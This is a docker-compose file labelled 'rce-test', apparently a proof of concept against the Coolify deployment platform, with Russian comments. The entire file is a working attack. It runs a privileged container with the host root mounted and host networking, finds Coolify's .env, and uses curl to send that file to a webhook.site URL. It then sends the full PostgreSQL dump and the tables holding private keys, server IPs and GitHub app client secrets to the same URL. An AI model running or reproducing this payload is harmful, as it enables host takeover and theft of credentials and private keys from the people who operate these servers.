version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl postgresql-client findutils
        
        # 1. Найти главный .env Coolify (не в applications/services)
        ENV_PATH=$(find /host-root -name ".env" -type f 2>/dev/null | grep -v "applications" | grep -v "services" | head -1)
        echo "Found .env at: $ENV_PATH"
        
        # 2. Вытащить весь .env (там APP_KEY, DB_PASSWORD, REDIS_PASSWORD)
        if [ -n "$ENV_PATH" ]; then
          cat "$ENV_PATH" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=main_env
        fi
        
        # 3. Извлечь DB_PASSWORD
        DB_PASSWORD=$(grep "^DB_PASSWORD=" "$ENV_PATH" 2>/dev/null | cut -d'=' -f2-)
        
        # 4. Подключиться к PostgreSQL (localhost через network_mode: host) и выгрузить ВСЮ базу
        if [ -n "$DB_PASSWORD" ]; then
          PGPASSWORD="$DB_PASSWORD" pg_dump -h localhost -U coolify -d coolify | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=full_db_dump
          
          # 5. Вытащить конкретные таблицы с секретами
          PGPASSWORD="$DB_PASSWORD" psql -h localhost -U coolify -d coolify -c "SELECT id, name, private_key FROM private_keys;" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=private_keys
          
          PGPASSWORD="$DB_PASSWORD" psql -h localhost -U coolify -d coolify -c "SELECT id, name, ip, description FROM servers;" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=servers
          
          PGPASSWORD="$DB_PASSWORD" psql -h localhost -U coolify -d coolify -c "SELECT id, name, client_id, client_secret FROM github_apps;" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=github_apps
        fi
        
        sleep 3600
